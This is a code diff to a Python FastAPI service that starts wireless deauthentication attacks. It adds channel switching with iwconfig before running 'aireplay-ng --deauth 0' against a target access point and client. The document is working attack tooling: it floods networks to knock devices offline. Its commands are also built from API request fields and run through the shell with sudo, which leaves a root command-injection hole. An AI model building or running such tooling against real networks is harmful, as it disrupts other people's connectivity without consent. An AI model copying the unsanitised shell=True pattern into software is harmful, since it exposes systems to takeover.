@@ -14,10 +14,11 @@ router = APIRouter()
 deauth_processes: Dict[str, dict] = {}
 
 class DeauthManager:
-    def __init__(self, adapter: str, target_bssid: str, target_mac: str = None):
+    def __init__(self, adapter: str, target_bssid: str, target_mac: str = None, channel: str = None):
         self.adapter = adapter
         self.target_bssid = target_bssid
         self.target_mac = target_mac
+        self.channel = channel
         self.process = None
         self.thread = None
         self.stop_event = threading.Event()
@@ -70,6 +71,19 @@ class DeauthManager:
     def _attack_worker(self):
         """Background worker that runs aireplay-ng deauth"""
         try:
+            # Set adapter to correct channel first if channel is specified
+            if self.channel:
+                channel_cmd = f"sudo iwconfig {self.adapter} channel {self.channel}"
+                print(f"Setting channel: {channel_cmd}")
+                channel_result = subprocess.run(channel_cmd, shell=True, capture_output=True, text=True)
+                
+                if channel_result.returncode != 0:
+                    print(f"Warning: Failed to set channel {self.channel}: {channel_result.stderr}")
+                else:
+                    print(f"Successfully set {self.adapter} to channel {self.channel}")
+                    # Wait a moment for channel to stabilize
+                    time.sleep(1)
+            
             # Build aireplay-ng command
             cmd = f"sudo aireplay-ng --deauth 0 -a {self.target_bssid}"
             if self.target_mac:
@@ -137,7 +151,7 @@ def start_deauth_attack(request: DeauthRequest):
                     }
             
             # Start new attack
-            manager = DeauthManager(request.adapter, request.target_bssid, request.target_mac)
+            manager = DeauthManager(request.adapter, request.target_bssid, request.target_mac, request.channel)
             if manager.start_attack():
                 deauth_processes[attack_key] = manager
                 
